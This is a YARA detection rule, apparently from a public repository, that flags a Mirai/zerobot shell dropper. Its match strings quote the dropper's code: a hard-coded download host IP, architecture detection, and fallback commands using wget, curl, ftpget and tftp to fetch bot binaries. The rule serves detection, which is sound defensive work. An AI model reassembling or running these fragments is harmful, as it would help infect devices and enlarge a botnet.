rule SCRIPT_Sample_Mirai_ba9c9d9d
{
    meta:
        author = "Marjoriefort"
        description = "Detects Mirai (script_sh, etat binaire)"
        date = "2026-10-02"
        reference_sha256 = "ba9c9d9d361d7df77a94b04aa66b7ae34c9d92b38e620ceeccc95058ea1c08a9"
        yarahub_uuid = "817f1547-bb85-4061-be53-e22df5a4d8db"
        famille = "Mirai"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "low"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "ff0392a6b6e6f80511315fd3e571cab1"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "cd /tmp 2>/dev/null || cd /var/run 2>/dev/null || cd /mnt 2>/dev/null || cd /root 2>/dev/null || cd / 2>/dev/null" ascii
        $s1 = "HOST=\"176.65.139.157\"" ascii
        $s2 = "BIN_DIR=\"fvbig\"" ascii
        $s3 = "PREFIX=\"zerobot.\"" ascii
        $s4 = "ARCH=$(/bin/busybox uname -m 2>/dev/null || uname -m 2>/dev/null || echo \"\")" ascii
        $s5 = "armv5l|armv5*) BIN=\"arm5\" ;;" ascii
        $s6 = "armv6l|armv6*) BIN=\"arm6\" ;;" ascii
        $s7 = "armv7l|armv7*) BIN=\"arm7\" ;;" ascii
        $s8 = "armv8*|aarch64) BIN=\"arm64\" ;;" ascii
        $s9 = "download_file() {" ascii
        $s10 = "URL=\"http://${HOST}/${BIN_DIR}/${FILE}\"" ascii
        $s11 = "/bin/busybox wget -q -O \"$FILE\" \"$URL\" >/dev/null 2>&1 && return 0" ascii
        $s12 = "busybox wget -q -O \"$FILE\" \"$URL\" >/dev/null 2>&1 && return 0" ascii
        $s13 = "wget -q -O \"$FILE\" \"$URL\" >/dev/null 2>&1 && return 0" ascii
        $s14 = "curl -s -o \"$FILE\" \"$URL\" >/dev/null 2>&1 && return 0" ascii
        $s15 = "/bin/busybox curl -s -o \"$FILE\" \"$URL\" >/dev/null 2>&1 && return 0" ascii
        $s16 = "busybox curl -s -o \"$FILE\" \"$URL\" >/dev/null 2>&1 && return 0" ascii
        $s17 = "ftpget -v -u anonymous -p anonymous -P 21 \"$HOST\" \"$FILE\" \"$FILE\" >/dev/null 2>&1 && return 0" ascii
        $s18 = "tftp \"$HOST\" -c get \"$FILE\" >/dev/null 2>&1 && return 0" ascii
        $s19 = "tftp -r \"$FILE\" -g \"$HOST\" >/dev/null 2>&1 && return 0" ascii
    condition:
        true and filesize < 50MB and 3 of ($s0, $s2, $s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14, $s15, $s16, $s17, $s18, $s19) and 1 of ($s1)
}
